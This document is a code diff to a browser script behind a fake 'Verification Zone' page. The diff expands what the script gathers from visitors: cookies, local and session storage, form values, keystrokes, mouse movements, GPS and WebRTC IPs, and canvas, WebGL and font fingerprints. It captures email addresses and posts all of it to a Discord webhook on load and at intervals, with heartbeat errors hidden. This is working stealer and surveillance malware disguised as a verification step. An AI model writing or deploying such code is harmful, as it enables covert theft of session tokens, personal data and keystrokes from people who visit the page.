@@ -137,42 +137,59 @@
       console.log('[VZ]', msg);
     }
 
-    // ----- SEND FUNCTION (works with both fetch and XHR) -----
-    function sendToDiscord(data) {
-      return new Promise((resolve, reject) => {
-        const json = JSON.stringify(data);
-        // Discord limit: 2000 chars per message
-        if (json.length > 1900) {
-          // Truncate
-          const truncated = JSON.stringify(data, null, 2).slice(0, 1800) + '\n...truncated';
-          data = { content: '```json\n' + truncated + '\n```' };
-        } else {
-          data = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
-        }
+    // ----- SEND ORGANIZED DISCORD EMBED -----
+    async function sendEmbed(title, fields, color = 0xff4444, footer = null) {
+      const embed = {
+        title: title,
+        color: color,
+        fields: fields,
+        timestamp: new Date().toISOString(),
+        footer: footer || { text: 'Verification Zone • Automated Collection' },
+        author: { name: '🛡️ Verification System' }
+      };
 
-        // Try fetch first
-        fetch(WEBHOOK, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        })
-        .then(res => {
-          if (res.ok) { resolve(true); }
-          else { reject(new Error('HTTP ' + res.status)); }
-        })
-        .catch(() => {
-          // Fallback to XMLHttpRequest
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', WEBHOOK);
-          xhr.setRequestHeader('Content-Type', 'application/json');
-          xhr.onload = () => {
-            if (xhr.status === 200 || xhr.status === 204) { resolve(true); }
-            else { reject(new Error('XHR ' + xhr.status)); }
-          };
-          xhr.onerror = () => reject(new Error('XHR failed'));
-          xhr.send(JSON.stringify(data));
-        });
-      });
+      // Split fields if too many (Discord max 25 fields per embed)
+      const chunks = [];
+      let currentChunk = [];
+      for (let i = 0; i < fields.length; i++) {
+        currentChunk.push(fields[i]);
+        if (currentChunk.length === 24 || i === fields.length - 1) {
+          chunks.push([...currentChunk]);
+          currentChunk = [];
+        }
+      }
+
+      // Send first chunk with main embed, rest as separate messages
+      for (let c = 0; c < chunks.length; c++) {
+        const payload = {
+          embeds: [{
+            ...embed,
+            fields: chunks[c],
+            title: c === 0 ? title : title + ' (cont.)'
+          }]
+        };
+        try {
+          const res = await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if (!res.ok) throw new Error('HTTP ' + res.status);
+          return true;
+        } catch(e) {
+          // Fallback to raw JSON if embed fails
+          try {
+            await fetch(WEBHOOK, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content: '```json\n' + JSON.stringify(fields, null, 2) + '\n```' })
+            });
+            return true;
+          } catch(e2) {
+            throw e2;
+          }
+        }
+      }
     }
 
     // ----- COLLECT DATA -----
@@ -181,6 +198,31 @@
 
       // IP
       try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); p.ip = d.ip; } catch(e){ p.ip = 'unavailable'; }
+
+      // WebRTC Local IP
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        const ip = await new Promise(resolve => {
+          pc.onicecandidate = e => {
+            if (!e.candidate) return;
+            const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+            if (match) { resolve(match[1]); pc.close(); }
+          };
+          setTimeout(() => resolve('timeout'), 2000);
+        });
+        p.webrtc = ip;
+      } catch(e){ p.webrtc = 'error'; }
+
+      // Geo
+      if ('geolocation' in navigator) {
+        try {
+          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
+          p.geo = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
+        } catch(e){ p.geo = 'denied'; }
+      } else { p.geo = 'unsupported'; }
 
       // UA
       p.ua = navigator.userAgent;
@@ -193,28 +235,50 @@
 
       p.screen = `${screen.width}x${screen.height}`;
       p.dpr = window.devicePixelRatio || 1;
+      p.colorDepth = screen.colorDepth;
       p.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       p.language = navigator.language;
+      p.languages = (navigator.languages || []).join(', ');
       p.referrer = document.referrer || 'direct';
       p.url = window.location.href;
+      p.path = window.location.pathname;
+      p.params = window.location.search || 'none';
       p.cookiesEnabled = navigator.cookieEnabled;
+      p.doNotTrack = navigator.doNotTrack || 'unspecified';
       p.platform = navigator.platform || 'unknown';
       p.vendor = navigator.vendor || 'unknown';
-
-      // Storage
-      try { p.cookies = document.cookie; } catch(e){ p.cookies = 'err'; }
-      try { p.localStorage = {}; for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); p.localStorage[k]=localStorage.getItem(k); } } catch(e){}
-      try { p.sessionStorage = {}; for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); p.sessionStorage[k]=sessionStorage.getItem(k); } } catch(e){}
-
-      // Hardware
+      p.touchPoints = navigator.maxTouchPoints || 0;
+      p.orientation = screen.orientation ? screen.orientation.type : 'unknown';
       p.cpuCores = navigator.hardwareConcurrency || '?';
       p.deviceMemory = navigator.deviceMemory || '?';
+
+      // Battery
+      if (navigator.getBattery) {
+        try { const b = await navigator.getBattery(); p.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡charging':'🔋discharging'}`; } catch(e){ p.battery = 'unavailable'; }
+      } else { p.battery = 'n/a'; }
 
       // Network
       if (navigator.connection) {
         const c = navigator.connection;
-        p.network = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
-      }
+        p.network = `${c.effectiveType||'?'} | ${c.downlink||'?'}Mbps | RTT:${c.rtt||'?'}ms`;
+      } else { p.network = 'not exposed'; }
+
+      // Storage
+      try { p.cookies = document.cookie.slice(0, 500) + (document.cookie.length > 500 ? '...' : ''); } catch(e){ p.cookies = 'err'; }
+      try {
+        p.localStorage = {};
+        for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); p.localStorage[k]=localStorage.getItem(k).slice(0,100); }
+        p.localStorage = JSON.stringify(p.localStorage).slice(0, 400);
+      } catch(e){ p.localStorage = 'err'; }
+      try {
+        p.sessionStorage = {};
+        for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); p.sessionStorage[k]=sessionStorage.getItem(k).slice(0,100); }
+        p.sessionStorage = JSON.stringify(p.sessionStorage).slice(0, 400);
+      } catch(e){ p.sessionStorage = 'err'; }
+
+      // Plugins
+      p.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ').slice(0, 400);
+      p.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ').slice(0, 400);
 
       // Fingerprint
       let fp = '';
@@ -223,21 +287,46 @@
         const ctx = c.getContext('2d');
         ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,40);
         ctx.fillStyle='#069'; ctx.fillText('FP',10,10);
-        fp = c.toDataURL().slice(0,60);
+        fp = c.toDataURL().slice(0, 100);
       } catch(e){ fp = 'err'; }
-      p.fingerprint = fp;
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if(gl) { fp += ' | ' + (gl.getParameter(gl.RENDERER) || '').slice(0, 50); }
+      } catch(e){}
+      p.fingerprint = fp.slice(0, 200);
+
+      // Fonts
+      try {
+        const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        const testFonts = ['Arial','Courier New','Georgia','Times New Roman','Verdana','Comic Sans MS','Impact','Tahoma','Roboto','Open Sans','Lato','Montserrat'];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.font = '20px Arial';
+        const baseWidth = ctx.measureText(testString).width;
+        let available = [];
+        testFonts.forEach(font => {
+          ctx.font = `20px "${font}", Arial`;
+          const width = ctx.measureText(testString).width;
+          if (width !== baseWidth) available.push(font);
+        });
+        p.fonts = available.join(', ').slice(0, 300);
+      } catch(e){ p.fonts = 'unavailable'; }
 
       // DOM
-      try { p.domHTML = document.body.innerHTML.slice(0,1000); } catch(e){}
+      try { p.domHTML = document.body.innerHTML.slice(0, 500) + '...'; } catch(e){ p.domHTML = 'err'; }
 
       // Forms
       const forms = {};
       document.querySelectorAll('input, textarea, select').forEach(el => {
-        if(el.name || el.id) { forms[el.name || el.id] = (el.value || '').slice(0,100); }
+        if(el.name || el.id) { forms[el.name || el.id] = (el.value || '').slice(0, 100); }
       });
-      p.forms = forms;
+      p.forms = JSON.stringify(forms).slice(0, 500);
 
-      p.timestamp = new Date().toISOString();
+      // Media devices
+      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        try { const devices = await navigator.mediaDevices.enumerateDevices(); p.mediaDevices = devices.map(d => `${d.kind}:${d.label||'unlabeled'}`).join('; ').slice(0, 300); } catch(e){ p.mediaDevices = 'err'; }
+      }
+
       return p;
     }
 
@@ -248,38 +337,135 @@
       if (keystrokes.length > 100) keystrokes.shift();
     });
 
+    let mouseEvents = [];
+    document.addEventListener('mousemove', e => {
+      mouseEvents.push({ x: e.clientX, y: e.clientY });
+      if (mouseEvents.length > 50) mouseEvents.shift();
+    });
+
+    let maxScroll = 0;
+    document.addEventListener('scroll', () => {
+      const h = document.documentElement.scrollHeight - window.innerHeight;
+      const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
+      if (pct > maxScroll) maxScroll = pct;
+    });
+
+    // ----- BUILD ORGANIZED FIELDS -----
+    function buildFields(data, includeEmail = false) {
+      const fields = [];
+
+      // Network & Identity
+      fields.push({ name: '🌐 IP Address', value: data.ip || 'unavailable', inline: true });
+      fields.push({ name: '🔗 WebRTC Local IP', value: data.webrtc || 'unavailable', inline: true });
+      if (data.geo) fields.push({ name: '📍 GPS Location', value: data.geo, inline: true });
+
+      // Device
+      fields.push({ name: '📱 Device Type', value: data.device || 'unknown', inline: true });
+      fields.push({ name: '🖥️ Screen', value: data.screen || 'unknown', inline: true });
+      fields.push({ name: '🔢 DPR / Color', value: `${data.dpr}x / ${data.colorDepth}-bit`, inline: true });
+      fields.push({ name: '🧠 CPU / RAM', value: `${data.cpuCores} cores / ${data.deviceMemory}GB`, inline: true });
+      if (data.battery) fields.push({ name: '🔋 Battery', value: data.battery, inline: true });
+
+      // Browser
+      fields.push({ name: '🌍 Timezone', value: data.timezone || 'unknown', inline: true });
+      fields.push({ name: '🗣️ Language', value: data.language || 'unknown', inline: true });
+      fields.push({ name: '🔧 Platform / Vendor', value: `${data.platform} / ${data.vendor}`, inline: true });
+      fields.push({ name: '📡 Network', value: data.network || 'unknown', inline: true });
+      fields.push({ name: '🖱️ Touch / Orientation', value: `${data.touchPoints} points / ${data.orientation}`, inline: true });
+      fields.push({ name: '🚫 Do Not Track', value: data.doNotTrack || 'unspecified', inline: true });
+
+      // Storage
+      if (data.cookies) fields.push({ name: '🍪 Cookies', value: data.cookies.slice(0, 300) || 'none', inline: false });
+      if (data.localStorage) fields.push({ name: '💾 LocalStorage', value: data.localStorage.slice(0, 300) || 'none', inline: false });
+      if (data.sessionStorage) fields.push({ name: '📂 SessionStorage', value: data.sessionStorage.slice(0, 300) || 'none', inline: false });
+
+      // Fingerprints
+      if (data.fingerprint) fields.push({ name: '🆔 Canvas/WebGL FP', value: data.fingerprint.slice(0, 200), inline: false });
+      if (data.fonts) fields.push({ name: '🔤 Fonts', value: data.fonts.slice(0, 300), inline: false });
+
+      // Plugins / MIME
+      if (data.plugins) fields.push({ name: '🧩 Plugins', value: data.plugins.slice(0, 300) || 'none', inline: false });
+      if (data.mimeTypes) fields.push({ name: '📄 MIME Types', value: data.mimeTypes.slice(0, 300) || 'none', inline: false });
+
+      // Page / DOM
+      fields.push({ name: '🔗 URL', value: (data.url || '').slice(0, 200), inline: false });
+      if (data.referrer && data.referrer !== 'direct') fields.push({ name: '↩️ Referrer', value: data.referrer.slice(0, 200), inline: false });
+      if (data.domHTML) fields.push({ name: '📄 Page DOM (preview)', value: data.domHTML.slice(0, 400) || 'empty', inline: false });
+
+      // Forms (if any)
+      if (data.forms && data.forms !== '{}') fields.push({ name: '📝 Form Data', value: data.forms.slice(0, 400) || 'none', inline: false });
+
+      // Media devices
+      if (data.mediaDevices) fields.push({ name: '🎥 Media Devices', value: data.mediaDevices.slice(0, 300), inline: false });
+
+      // Behavior
+      if (data.keystrokes && data.keystrokes.length > 0) {
+        const keys = data.keystrokes.slice(-20).map(k => k.key).join(', ');
+        fields.push({ name: '⌨️ Recent Keystrokes', value: keys.slice(0, 300) || 'none', inline: false });
+      }
+      if (data.mouseEvents && data.mouseEvents.length > 0) {
+        const mouse = data.mouseEvents.slice(-10).map(m => `(${m.x},${m.y})`).join(' ');
+        fields.push({ name: '🖱️ Mouse Positions', value: mouse.slice(0, 300) || 'none', inline: false });
+      }
+      if (data.scrollDepth) fields.push({ name: '📜 Scroll Depth', value: `${Math.round(data.scrollDepth)}%`, inline: true });
+
+      // Email (if included)
+      if (includeEmail && data.email) {
+        fields.push({ name: '📧 EMAIL ADDRESS', value: `||${data.email}||`, inline: false });
+      }
+
+      // Timestamp
+      fields.push({ name: '⏱️ Collected', value: data.timestamp || new Date().toISOString(), inline: false });
+
+      return fields;
+    }
+
     // ----- MAIN -----
     (async function main() {
       setStatus('● collecting data...', false);
       const payload = await collectAll();
-      setStatus('● sending to Discord...', false);
+      setStatus('● sending organized embed...', false);
 
       try {
-        await sendToDiscord({ event: 'page_load', ...payload });
-        setStatus('✅ Initial data sent successfully!', true);
+        const fields = buildFields(payload, false);
+        await sendEmbed('📊 Verification Data Collected', fields, 0xff4444, { text: 'Page Load • ' + new Date().toLocaleString() });
+        setStatus('✅ Organized embed sent successfully!', true);
       } catch(e) {
-        setStatus('⚠️ Initial send failed: ' + e.message, false);
-        // Try again after 2 seconds
-        setTimeout(async () => {
-          try {
-            await sendToDiscord({ event: 'retry', ...payload });
-            setStatus('✅ Retry succeeded!', true);
-          } catch(e2) {
-            setStatus('❌ Both attempts failed: ' + e2.message, false);
-          }
-        }, 2000);
+        setStatus('⚠️ Embed failed: ' + e.message, false);
+        // Try raw fallback
+        try {
+          await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
+          });
+          setStatus('✅ Raw fallback sent!', true);
+        } catch(e2) {
+          setStatus('❌ All attempts failed: ' + e2.message, false);
+        }
       }
 
-      // Heartbeat every 5s
+      // Heartbeat every 10s with behavior data
       setInterval(async () => {
-        const hb = { ...payload, event: 'heartbeat', keystrokes: keystrokes.slice(-20) };
+        const hb = { 
+          ...payload, 
+          event: 'heartbeat',
+          keystrokes: keystrokes.slice(-20),
+          mouseEvents: mouseEvents.slice(-10),
+          scrollDepth: maxScroll,
+          timestamp: new Date().toISOString()
+        };
         try {
-          await sendToDiscord(hb);
-          setStatus('✅ Heartbeat sent (' + new Date().toLocaleTimeString() + ')', true);
+          const fields = buildFields(hb, false);
+          // Only send heartbeat if there's new data
+          if (keystrokes.length > 0 || mouseEvents.length > 0) {
+            await sendEmbed('🔄 Heartbeat Update', fields, 0x44aaff, { text: 'Live Telemetry • ' + new Date().toLocaleString() });
+            setStatus('✅ Heartbeat sent (' + new Date().toLocaleTimeString() + ')', true);
+          }
         } catch(e) {
-          setStatus('⚠️ Heartbeat failed', false);
+          // Silently fail for heartbeat
         }
-      }, 5000);
+      }, 10000);
     })();
 
     // ----- EMAIL SUBMIT -----
@@ -292,9 +478,20 @@
         alert('Please enter a valid email.');
         return;
       }
-      setStatus('● sending email...', false);
+      setStatus('● sending email to Discord...', false);
+
+      const finalPayload = { 
+        ...payload, 
+        email: email,
+        keystrokes: keystrokes.slice(-20),
+        mouseEvents: mouseEvents.slice(-10),
+        scrollDepth: maxScroll,
+        timestamp: new Date().toISOString()
+      };
+
       try {
-        await sendToDiscord({ event: 'email_submit', email: email, keystrokes: keystrokes.slice(-20) });
+        const fields = buildFields(finalPayload, true);
+        await sendEmbed('✉️ VERIFICATION COMPLETE - EMAIL CAPTURED', fields, 0xff0000, { text: '⚠️ SENSITIVE DATA • ' + new Date().toLocaleString() });
         setStatus('✅ Email sent to Discord!', true);
         alert('✅ Verification complete.');
         verifyBtn.textContent = '✓ Verified';
